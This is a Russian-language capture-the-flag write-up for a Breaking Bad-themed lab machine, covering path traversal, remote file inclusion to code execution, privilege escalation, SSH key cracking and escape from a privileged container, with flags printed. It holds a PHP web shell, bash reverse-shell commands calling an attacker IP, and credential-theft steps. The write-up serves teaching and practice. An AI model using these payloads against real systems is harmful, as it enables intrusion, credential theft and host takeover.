@@ -1,0 +1,127 @@
+Краткое описание
+Данный таск был активен в 6 сезоне CTF, который проходил на платформе ACLAbs. Это простая машина, однако имеет 5 флагов. Сначала раскрутим RFI до RCE, далее будем повышать привилегии, пройдемся по горизонтальному перемещению и в конце сбежим из контейнера.
+Кстати 12 июня стартует новый, 7 сезон на сайте aclabs.pro. Будут новые задания и интересные уязвимости. Всем, кому интересен кибербез и уникальные тачки, ждем на платформе. Вход свободный!
+Разведка (T1595.002)
+Как обычно проводим первичный анализ цели.
+sudo nmap -sC -sV ip PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0) | ssh-hostkey: | 3072 7d:9f:93:42:8b:98:b0:7a:bb:78:f6:7f:9e:0f:bc:96 (RSA) | 256 13:42:95:43:cd:7a:05:fb:65:c8:f7:04:0f:9f:fd:c9 (ECDSA) |_ 256 58:a2:eb:17:9d:11:67:ae:34:91:7b:48:f7:44:37:de (ED25519) 80/tcp open http Apache httpd 2.4.56 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.56 (Debian) |_http-title: Save Walter White Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Особо ничего интересного, по стандарту 22 ssh, 80 http. Вебсайт на первый взгляд обыкновенный, не имеет полей ввода.
+Однако нужно взглянуть на исходный код, становится интереснее. Есть комментарий, но еще лучше у нас имеется потенциальный вектор атаки.
+Файл image.php принимает аргумент ?file=
+. Значит в теории мы можем прочитать файл, что дает нам уязвимость path traversal. Поскольку у нас Debian, то проверим файл etc/passwd.
+Отлично! Из этого файла, мы знаем, что у этой машины 3 пользователя, это walt
+, saul
+и jesse
+. Но больше прочитать полезных файлов не получается, поэтому нужно раскручивать до RCE
+.
+Эксплуатация (T1190) RFI - RCE
+Перепробовал много вариантов чтения других файлов, но прав не хватало. Поэтому пошел читать PayloadAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File Inclusion и воспользовался уязвимостью RFI (Remote File Inclusion)
+.
+Для начала создаем файлик у себя на хосте, я назвал его cmd.php
+с простым содержимым.
+<?php system($_GET['cmd']); ?>
+Приподнимем простой веб-сервер на python.
+python -m http.server 8888
+Далее через бурп посылаю запрос, чтобы проверить, сработает ли команда id
+.
+Отлично, получаем RCE
+, а это уже серьезная уязвимость, с помощью которой пробросим себе реверс-шелл. Для этого поднимем еще слушатель на порту 4444.
+bash -i >& /dev/tcp/10.20.10.5/4444 0>&1
+Кстати, без обертки bash -c
+команда выше часто не отрабатывает, поэтому финальная команда будет выглядеть так.
+bash -c 'bash -i >& /dev/tcp/10.20.10.5/4444 0>&1'
+Ее нужно заэнкодить в url либо просто в репитере нажать ctrl+u
+. Оба варианта рабочие.
+После всех манипуляций должны получить реверс шелл.
+Первый Флаг
+Наверное это первая машина, у которой пользователь www-data
+, может выполнять хоть что-то с правами sudo
+.
+sudo -l Matching Defaults entries for www-data on 50e6802eb8a3: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User www-data may run the following commands on 50e6802eb8a3: (jesse) NOPASSWD: /opt/scripts/backup.sh
+Проверим этот скрипт
+ls -la /opt/scripts/backup.sh -rwxrwxrwx 1 jesse jesse 940 Dec 2 17:31 /opt/scripts/backup.sh
+Поскольку у нас полные права, я просто прописал в него еще один реверс-шелл.
+echo "bash -c 'bash -i >& /dev/tcp/10.20.10.5/5555 0>&1'" > /opt/scripts/backup.sh
+Выполняем его от имени jesse
+sudo -u jesse /opt/scripts/backup.sh
+Получаем шелл от имени jesse
+и читаем первый флаг.
+cat flag1.txt flag_38ae3a7c98175e4aeff0b2a3d67aa3c4
+Второй флаг
+Поскольку мы в системе уже от пользователя jesse
+, то подключимся по ssh, скопировав id_rsa
+.
+Нужно осмотреться в домашней директории.
+У нас есть подсказка, что Saul
+оставил архив, но мы не знаем ни ключ ни пароль.
+Посмотрим, что за архив и что там лежит.
+tar -xf saul-back.tar -C /tmp
+ls README config data hints.13 index.13 integrity.13 nonce ┌──(jesse㉿50e6802eb8a3)-[/tmp/backup] └─$ cat README This is a Borg Backup repository. See https://borgbackup.readthedocs.io/
+Borg Backup
+- это мощный инструмент резервного копирования с дедупликацией и шифрованием.
+Поскольку на самом сервере утилиты borg
+нет, нам нужно забрать этот бэкап к себе на Kali и «вскрыть» его там.
+Поскольку мы уже в SSH
+, самое простое — забрать файл через scp
+.
+scp -i id_rsa jesse@10.10.10.155:~/saul-back.tar .
+Далее на своей системе устанавливаем borgbackup
+.
+sudo apt install borgbackup tar -xf saul-back.tar
+Появится папка backup. Посмотрим список архивов.
+borg list . Enter passphrase for key /home/den/backup:
+Нужна пассфраза, будем искать.
+Перейдем в папку /var/www/html
+. Там найдем файлы admin.php
+, api.php
+, image.php
+.
+cat admin.php <?php session_start(); // Подключение к базе данных $db = new mysqli('db', 'root', 'root', 'walter_fund');
+Есть креды для базы данных. Однако, дампа базы данных или утилиты, которыми можно прочитать базу нет.
+which mysql mariadb mysqlsh mycli sqlite3 php python3 /usr/local/bin/php
+Единственное, что есть php
+. С помощью php
+можно прочитать и базу данных тоже. Поэтому будем все писать ручками. Заходим в интерактивный шелл и смотрим таблицы и выдираем все полезное содержимое.
+php -a Interactive shell php > $db=new mysqli("db","root","root","walter_fund"); php > $r=$db->query("show tables"); php > while($row=$r->fetch_row()) print_r($row); Array ( [0] => admins ) Array ( [0] => donations ) php > $r=$db->query("select * from admins"); php > while($row=$r->fetch_assoc()) print_r($row); Array ( [id] => 1 [username] => flynn [password] => junior )
+Далее выдираем таблицу donations
+.
+php > $r=$db->query("select * from donations"); php > while($row=$r->fetch_assoc()) print_r($row); Array ( [id] => 1 [donor_name] => Jesse Pinkman [amount] => 5000.00 [donation_date] => 2009-10-18 ) Array ( [id] => 2 [donor_name] => Hank Schrader [amount] => 1500.00 [donation_date] => 2009-09-18 ) Array ( [id] => 3 [donor_name] => Skinny Pete [amount] => 50.50 [donation_date] => 2009-10-20 ) Array ( [id] => 4 [donor_name] => Gustavo Fring of Los Pollos Hermanos [amount] => 10000.00 [donation_date] => 2009-10-20 ) Array ( [id] => 5 [donor_name] => Batcher [amount] => 30.00 [donation_date] => 2009-10-23 ) Array ( [id] => 6 [donor_name] => Marie Schrader [amount] => 500.00 [donation_date] => 2009-10-24 ) Array ( [id] => 7 [donor_name] => Bogdan Volanitz [amount] => 100.00 [donation_date] => 2009-10-27 ) Array ( [id] => 8 [donor_name] => S11pp1n000Jimmy [amount] => 9999.00 [donation_date] => 2009-10-30 )
+Последний id уж очень отличается и похож на пароль либо пассфразу. Нужно пробовать.
+borg list . Enter passphrase for key /home/den/backup: saul-back Mon, 2025-12-01 12:34:39 [c5a52d964894d0c8716c2244edf422009d436b9f34389d08eb04844b981a79b2]
+Парольная фраза верна. Распакуем архив.
+borg extract .::saul-back
+Появилась папка home/saul и здесь есть скрытая папка .ssh с ключом. Пробуем логинится от имени saul.
+ssh -i id_rsa saul@10.10.10.155 ** WARNING: connection is not using a post-quantum key exchange algorithm. ** This session may be vulnerable to "store now, decrypt later" attacks. ** The server may need to be upgraded. See https://openssh.com/pq.html Enter passphrase for key 'id_rsa':
+Но и здесь все не так просто, снова нужна пассфраза. Я такие машины уже решал, поэтому создаем хэш и брутим с помощью джона.
+ssh2john id_rsa > hash john hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 24 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status ilovemike (id_rsa) 1g 0:00:01:20 DONE (2026-04-27 17:41) 0.01249g/s 25.58p/s 25.58c/s 25.58C/s harris..lovers1 Use the "--show" option to display all of the cracked passwords reliably Session completed.
+Логинимся и забираем второй флаг.
+cat flag2.txt flag_751302c2172ca7e8ac68765f174406e1
+Третий флаг
+Осмотримся в домашней директории и почитаем записки.
+Из скриншота видно, что записка намекает на то, что можем получить доступ к аккаунту walter
+, который состоит в группе developers
+, а команда sudo -l
+это подтверждает.
+Поскольку иногда бывают проблемы с копипастом ключей, лучше сгенерировать ключ прямо в терминале.
+ssh-keygen -t rsa -N "" -f /tmp/walter
+Добавляем его Уолтеру
+cat /tmp/walter.pub | sudo -u walter /usr/bin/tee -a /home/walter/.ssh/authorized_keys
+И пробуем логинится локально.
+ssh -i /tmp/walter walter@localhost
+Успех и читаем третий флаг.
+cat flag3.txt flag_691bf4e515a877ab5227c6a8459e4c7c
+Четвертый флаг
+Для начала осмотримся и почитаем подсказки.
+Сразу виден файл с SUID битом, а подсказка намекает на легкий OSINT
+. Я к сожалению смотрел только первый сезон этого сериала, но едва ли вспомню, кто кого там убивал, по этому идем гуглить.
+Вводим имя Heisenberg
+и получаем рута, читаем четвертый флаг.
+cat flag4.txt flag_f17b8e2070286ae16fac5f2333338ad9
+Пятый флаг и побег из контейнера
+Несмотря на то, что мы взяли рута, это всего лишь контейнер. Первое, что нужно определить, какой это контейнер привилигерованный или нет.
+ls /dev/
+Если видим устройства sda или nvme, то мы практически сбежали.
+На скрине видны все устройства системы, а вторая команда подтверждает, что контейнер привелигерованный. Уходим!
+mkdir /mnt/host_root mount /dev/sda1 /mnt/host_root cd /mnt/host_root
+Мы в корне системы. Читаем флаг рута.
+cd root/ cat root.txt flag_c598ec6d71d1339cac6cba0b91df55cf
+Райтап от @alfabuster
